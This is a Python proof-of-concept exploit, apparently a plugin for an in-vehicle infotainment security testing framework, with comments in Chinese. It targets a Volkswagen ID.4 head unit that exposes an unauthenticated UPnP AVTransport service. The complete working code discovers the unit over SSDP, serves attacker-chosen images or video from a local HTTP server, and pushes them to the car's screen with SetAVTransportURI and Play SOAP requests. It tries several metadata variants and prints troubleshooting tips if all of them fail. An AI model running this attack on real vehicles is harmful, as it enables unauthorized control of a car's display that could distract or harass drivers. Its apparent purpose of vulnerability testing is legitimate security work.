"""
PoC Name: VW ID.4 UPnP AVTransport Media Injection
Identifier: CWE-306
Component: Application Stack / UPnP
Category: Application
Severity: High
CVSS: 7.5
Description: 针对大众 ID.4 车机的 UPnP AVTransport 未授权媒体注入 PoC，支持多种投屏方法和参数组合。
Prerequisites: 与目标车机处于同一局域网。
Usage: python3 14_VW_ID4_MediaInjection.py <target_ip> --media <path>
"""
import socket
import requests
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
import threading
import time
import os
import sys
from http.server import SimpleHTTPRequestHandler, HTTPServer
from iv_plugin_base import IVIVulnerabilityPlugin

class VWId4MediaInjectionPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-014"
    meta_poc_name = "VW ID.4 Media Injection"
    meta_cve_id = "CWE-306"
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    LOCAL_PORT = 8000

    def __init__(self, target_config, logger=None, media_file=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "UPnP-VW-ID4-Media-Injection"
        self.results["description"] = "大众 ID.4 UPnP AVTransport 未授权媒体注入"
        self.httpd = None
        self.media_file = media_file
        self.media_content = None
        self.media_type = "video/mp4"
        self.file_name = "media.mp4"

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需指定目标 IP")
        return None  # type: ignore

    def _load_media_file(self):
        """加载媒体文件"""
        if self.media_file and os.path.isfile(self.media_file):
            self.logger.info(f"[*] 加载媒体文件: {self.media_file}")
            with open(self.media_file, 'rb') as f:
                self.media_content = f.read()
            
            if self.media_file.lower().endswith(('.jpg', '.jpeg')):
                self.media_type = "image/jpeg"
                self.file_name = "image.jpg"
            elif self.media_file.lower().endswith('.png'):
                self.media_type = "image/png"
                self.file_name = "image.png"
            elif self.media_file.lower().endswith(('.mp4', '.m4v')):
                self.media_type = "video/mp4"
                self.file_name = "video.mp4"
            elif self.media_file.lower().endswith('.mov'):
                self.media_type = "video/quicktime"
                self.file_name = "video.mov"
            
            self.logger.info(f"[*] 媒体类型: {self.media_type}, 大小: {len(self.media_content)} 字节")
            return True
        else:
            self.logger.error(f"[-] 媒体文件不存在: {self.media_file}")
            return False

    def _start_http_server(self):
        try:
            media_content = self.media_content or b''
            media_type = self.media_type
            logger = self.logger
            
            class MediaHandler(SimpleHTTPRequestHandler):
                def do_GET(self):
                    logger.debug(f"[HTTP] GET {self.path}")
                    if any(x in self.path.lower() for x in ['media', 'image', 'video', 'stream']):
                        self.send_response(200)
                        self.send_header('Content-Type', media_type)
                        self.send_header('Content-Length', str(len(media_content)))
                        self.send_header('Accept-Ranges', 'bytes')
                        self.send_header('Connection', 'close')
                        self.end_headers()
                        self.wfile.write(media_content)
                        logger.info(f"[+] 已发送媒体内容 ({len(media_content)} 字节)")
                    else:
                        self.send_response(404)
                        self.end_headers()
                
                def log_message(self, format, *args):
                    pass
            
            self.httpd = HTTPServer(("0.0.0.0", self.LOCAL_PORT), MediaHandler)
            self.logger.info(f"[HTTP] 媒体服务器启动 (端口 {self.LOCAL_PORT})")
            t = threading.Thread(target=self.httpd.serve_forever, daemon=True)
            t.start()
            return True
        except Exception as e:
            self.logger.error(f"启动媒体服务器失败: {e}")
            return False

    def _discover_location(self):
        """SSDP 发现"""
        msg = "\r\n".join([
            'M-SEARCH * HTTP/1.1',
            'HOST: 239.255.255.250:1900',
            'MAN: "ssdp:discover"',
            'MX: 2',
            'ST: urn:schemas-upnp-org:service:AVTransport:1',
            '', ''
        ]).encode('utf-8')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(3)
        self.logger.info("[1/8] 发送 SSDP 发现请求...")
        
        try:
            sock.sendto(msg, ("239.255.255.250", 1900))
            start_time = time.time()
            while time.time() - start_time < 5:
                try:
                    data, addr = sock.recvfrom(65507)
                    if addr[0] == self.target_ip and b"LOCATION:" in data.upper():
                        for line in data.decode(errors='ignore').split("\r\n"):
                            if line.upper().startswith("LOCATION:"):
                                loc = line.split(":", 1)[1].strip()
                                self.logger.info(f"[+] 发现 LOCATION: {loc}")
                                return loc
                except socket.timeout:
                    break
        except Exception as e:
            self.logger.error(f"SSDP 异常: {e}")
        finally:
            sock.close()
        return None

    def _get_control_url(self, location_url):
        """提取 AVTransport ControlURL"""
        try:
            self.logger.info(f"[*] 获取设备描述符: {location_url}")
            resp = requests.get(location_url, timeout=5)
            xml_root = ET.fromstring(resp.content)
            ns = {"urn": "urn:schemas-upnp-org:device-1-0"}
            
            # 诊断：显示所有服务
            self.logger.debug("[诊断] 设备支持的服务:")
            for service in xml_root.findall(".//urn:service", ns):
                stype_elem = service.find("urn:serviceType", ns)
                if stype_elem is not None:
                    stype = stype_elem.text or ""
                    self.logger.debug(f"  - {stype}")
            
            # 查找 AVTransport
            for service in xml_root.findall(".//urn:service", ns):
                stype = service.find("urn:serviceType", ns)
                curl = service.find("urn:controlURL", ns)
                
                if stype is not None and curl is not None:
                    service_type = stype.text or ""
                    if "AVTransport" in service_type:
                        control_url = curl.text or ""
                        full_url = urljoin(location_url, control_url)
                        self.logger.info(f"[2/8] AVTransport Service Found")
                        self.logger.info(f"     类型: {service_type}")
                        self.logger.info(f"     ControlURL: {full_url}")
                        return full_url
        except Exception as e:
            self.logger.error(f"解析 ControlURL 失败: {e}")
        return None

    def _send_soap_action(self, ctrl_url, action, instance_id, params, metadata="", timeout=15):
        """发送通用 SOAP 动作"""
        param_str = "".join(f"<{k}>{v}</{k}>" for k, v in params.items())
        
        soap = f"""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:{action} xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
<InstanceID>{instance_id}</InstanceID>
{param_str}
</u:{action}>
</s:Body>
</s:Envelope>"""
        
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": f'"urn:schemas-upnp-org:service:AVTransport:1#{action}"',
            "Connection": "close",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        
        self.logger.debug(f"[SOAP] 发送 {action} 到 {ctrl_url}")
        self.logger.debug(f"[SOAP] 请求体大小: {len(soap)} 字节")
        
        try:
            r = requests.post(ctrl_url, data=soap.encode('utf-8'), headers=headers, timeout=timeout)
            self.logger.debug(f"[SOAP] {action} 响应状态: {r.status_code}")
            return r.status_code, r.text
        except requests.exceptions.Timeout:
            self.logger.error(f"{action} 超时 ({timeout}s): 车机响应缓慢，可能在处理中")
            return None, "Timeout"
        except Exception as e:
            self.logger.error(f"{action} 失败: {e}")
            return None, str(e)

    def _try_injection_method(self, ctrl_url, media_url, method_name, metadata=""):
        """尝试特定的注入方法"""
        self.logger.info(f"[*] 尝试方法: {method_name}")
        
        # SetAVTransportURI - 增加超时时间
        self.logger.info(f"  ├─ 发送 SetAVTransportURI...")
        status1, resp1 = self._send_soap_action(
            ctrl_url, "SetAVTransportURI", "0",
            {"CurrentURI": media_url, "CurrentURIMetaData": metadata},
            timeout=20  # 增加到 20 秒
        )
        
        if status1 is None:
            self.logger.debug(f"  └─ SetAVTransportURI 网络失败: {resp1}")
            return False
        
        if status1 != 200:
            self.logger.debug(f"  └─ SetAVTransportURI 返回: HTTP {status1}")
            return False
        
        self.logger.info(f"  ├─ SetAVTransportURI: HTTP {status1} ✓")
        time.sleep(0.5)  # 等待车机处理
        
        # Play - 增加超时时间
        self.logger.info(f"  ├─ 发送 Play...")
        status2, resp2 = self._send_soap_action(
            ctrl_url, "Play", "0",
            {"Speed": "1"},
            timeout=20  # 增加到 20 秒
        )
        
        if status2 is None:
            self.logger.debug(f"  └─ Play 网络失败: {resp2}")
            return False
        
        if status2 != 200:
            self.logger.debug(f"  └─ Play 返回: HTTP {status2}")
            return False
        
        self.logger.info(f"  └─ Play: HTTP {status2} ✓")
        return True

    def exploit(self):
        # 0. 加载媒体
        if not self._load_media_file():
            return
        
        # 1. 发现
        location = self._discover_location()
        if not location:
            self.logger.warning("[-] 未发现 AVTransport 服务")
            return

        # 2. 获取 ControlURL
        ctrl_url = self._get_control_url(location)
        if not ctrl_url:
            return

        # 3. 启动 HTTP 服务
        if not self._start_http_server():
            return
        time.sleep(0.5)
        
        # 获取本机 IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.target_ip, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "127.0.0.1"

        media_url = f"http://{local_ip}:{self.LOCAL_PORT}/{self.file_name}"
        self.logger.info(f"[3/8] 媒体 URL: {media_url}")

        # 4-7. 尝试多种方法
        self.logger.info("[4/8] 开始尝试多种注入方法...")
        
        methods = []
        
        # 方法 1: 无元数据（最简单）
        methods.append(("方法 1: 空元数据", media_url, ""))
        
        # 方法 2: 简单的 DIDL-Lite 元数据
        simple_metadata = f'&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/"&gt;&lt;item&gt;&lt;res&gt;{media_url}&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;'
        methods.append(("方法 2: 简单 DIDL-Lite", media_url, simple_metadata))
        
        # 方法 3: 完整的 DIDL-Lite 元数据
        upnp_class = "object.item.videoItem.movie" if "video" in self.media_type else "object.item.imageItem.photo"
        full_metadata = f'&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/"&gt;&lt;item id="0" parentID="-1" restricted="0"&gt;&lt;dc:title&gt;Media&lt;/dc:title&gt;&lt;upnp:class&gt;{upnp_class}&lt;/upnp:class&gt;&lt;res protocolInfo="http-get:*:{self.media_type}:*"&gt;{media_url}&lt;/res&gt;&lt;/item&gt;&lt;/DIDL-Lite&gt;'
        methods.append(("方法 3: 完整 DIDL-Lite", media_url, full_metadata))
        
        success = False
        successful_method = None
        for method_name, url, metadata in methods:
            if self._try_injection_method(ctrl_url, url, method_name, metadata):
                success = True
                successful_method = method_name
                self.logger.warning(f"[!] 【成功】{method_name} 投屏成功!")
                break
            time.sleep(0.5)
        
        # 8. 结论
        self.logger.info("[8/8] 执行完成")
        time.sleep(1)
        
        if success:
            self.results["vulnerable"] = True
            self.results["evidence"] = f"Media injection successful via {successful_method}: {media_url}"
        else:
            self.results["vulnerable"] = False
            self.results["evidence"] = "All injection methods failed"
            self.logger.warning("[-] 所有方法均失败")
            self.logger.info("[*] 诊断建议:")
            self.logger.info("    ① 网络问题:")
            self.logger.info("       - 检查与车机的连接延迟: ping <车机IP>")
            self.logger.info("       - 增加请求超时时间 (已从 8s 增加到 20s)")
            self.logger.info("    ② AVTransport 问题:")
            self.logger.info("       - 上面输出中 ControlURL 的端口号是否正确?")
            self.logger.info("       - 是否支持 AVTransport:2 而非 :1?")
            self.logger.info("    ③ 车机状态:")
            self.logger.info("       - 尝试重启车机后再次运行")
            self.logger.info("       - 车机是否处于忙碌状态?")
            self.logger.info("    ④ 替代方案:")
            self.logger.info("       - 尝试用最小的媒体文件测试")
            self.logger.info("       - 尝试 13_Mirror_Hijack.py 脚本")

        if self.httpd:
            self.httpd.shutdown()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 14_VW_ID4_MediaInjection.py <target_ip> --media <path>")
        print("  target_ip: 车机 IP 地址")
        print("  --media:   媒体文件路径")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    media_file = None
    
    if "--media" in sys.argv:
        idx = sys.argv.index("--media")
        if idx + 1 < len(sys.argv):
            media_file = sys.argv[idx + 1]
    
    plugin = VWId4MediaInjectionPlugin({"target_ip": target_ip}, media_file=media_file)
    plugin.run_verify()
